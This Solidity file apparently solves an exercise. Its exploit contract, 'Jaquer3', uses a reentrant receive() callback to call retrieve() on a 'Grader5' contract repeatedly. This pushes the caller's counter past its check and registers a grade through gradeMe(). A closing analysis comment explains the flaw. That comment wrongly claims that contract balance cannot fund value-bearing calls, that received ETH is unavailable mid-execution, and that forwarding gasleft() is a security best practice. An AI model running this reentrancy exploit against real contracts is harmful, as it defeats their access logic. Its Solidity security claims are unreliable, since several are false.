// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

/**
 * @title IGrader5 Interface
 * @dev Interface for interacting with the vulnerable Grader5 contract
 * @notice This interface defines the functions we need to interact with Grader5.sol
 */
interface IGrader5 {
    /**
     * @notice Function to deposit ETH and increment caller's counter
     * @dev Requires msg.value > 3 wei, refunds 1 wei to caller
     * @dev Resets counter to 0 if counter[msg.sender] < 2 after increment
     */
    function retrieve() external payable;

    /**
     * @notice Function to register a grade for the caller
     * @dev Only works if counter[msg.sender] > 1 and within valid timestamp range
     * @param name The student name to register (must be unique)
     * @dev Calculates grade based on studentCounter and divisor
     * @dev Prevents duplicate registrations (name and address)
     */
    function gradeMe(string calldata name) external;

    /**
     * @notice Gets the call counter for a specific address
     * @param addr The address to query
     * @return The number of times retrieve() was called by this address
     */
    function counter(address addr) external view returns (uint256);
}

/**
 * @title Jaquer
 * @dev Exploit contract targeting vulnerabilities in Grader5.sol
 * @notice This contract demonstrates a recursive callback attack on Grader5.sol
 */
contract Jaquer3 {
    /// @notice Interface to interact with the vulnerable Grader5 contract
    IGrader5 public grader;
    
    /// @notice Name to be registered in the grading system
    string public targetName;
    
    /// @notice Counter for retrieve() calls made during attack
    uint256 public retrieveCount;
    
    /// @notice Owner of the contract
    address public owner;

    /****   Modifiers   *******/

    /**
     * @dev Restricts function access to only the contract owner
     * @dev Reverts if called by any account other than the owner
     */
    modifier onlyOwner() {
        require(owner == msg.sender, "Caller is not the owner");
        _;
    }
    
    /**
     * @dev Initializes the contract with the target Grader5 address
     * @param graderAddress Address of the vulnerable Grader5 contract
     */
    constructor(address graderAddress) payable {
        owner = msg.sender;
        grader = IGrader5(graderAddress);
    }
    
    /**
     * @notice Initiates the attack on Grader5 contract
     * @dev Requires at least 12 wei to cover three retrieve() calls
     * @param name The student name to register in the grading system
     */
    function attack(string calldata name) external payable onlyOwner {
        require(msg.value >= 12, "Insufficient ETH: Need at least 12 wei");
        targetName = name;
        retrieveCount = 0;
        // Start the attack by making the first retrieve() call
        grader.retrieve{value: 4}();
    }

    /**
     * @dev Callback function triggered by Grader5's ETH transfer
     * @notice Handles the recursive attack logic
     */
    receive() external payable {
        retrieveCount++;
        
        // Check if we've achieved counter > 1 in Grader5
        if (grader.counter(address(this)) > 1) {
            // Final step: register the grade
            grader.gradeMe(targetName);
        } else {
            // Continue the attack with another retrieve() call
            if (retrieveCount < 3) { // Prevent infinite recursion
                grader.retrieve{value: 4}();
            }
        }
    }
    
    /**
     * @notice Withdraws all ETH from the contract
     * @dev Can only be called by the owner
     */
    function withdraw() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}

/* HACK ANALYSIS for Grader5 Vulnerability

  This vulnerability exists because Grader5 trusts that msg.sender will be a legitimate user 
  and doesn't verify if it's a contract that can callback Grader5 when it executes: 
       payable(msg.sender).call{value: 1, gas: gasleft()}("");
           - gasleft() in this context is a security best practice that ensures the receiving contract has enough gas to execute

  A proper solution would be to use OpenZeppelin's isContract() to prevent contracts from calling these functions.

# The Jaquer contract needs sufficient ETH for 3 calls (minimum 12 wei).

# The name provided to gradeMe must be unique (not previously registered in Grader5).

# The attack will only work if:
    - Current timestamp is within startTime and deadline range (default values allow most timestamps)
    - First msg.value > 3 wei
    - After the first retrieve() call, the callback() recursively calls retrieve() again to increment counter[msg.sender]

# We need to specify msg.value >12 in the initial call in addition to each retrieve() call 
   (even if the contract has sufficient balance). This is due to how Solidity handles ETH in inter-contract calls. 
   When we execute:     
        grader.retrieve{value: 4}();
   We're not using the contract's balance, but sending ETH with the call. 
   This is critical because:

    a) The value: 4 must come explicitly from:
          - The initial transaction's msg.value, or
          - ETH received in the same transaction (with limitations)
    b) The contract balance isn't automatically used for these calls.

  Why isn't contract balance sufficient?:
    a) Security mechanism: Solidity doesn't automatically use contract balance for external calls to prevent unintended spending
    b) Recursive callback issue:
         - When receiving ETH in receive(), that ETH isn't immediately available for the next call
         - The balance updates after execution completes

  In summary, using msg.value is necessary because:
    - Guarantees ETH is available for all calls
    - Completes the entire flow in a single transaction
    - Is the standard pattern for these interactions
*/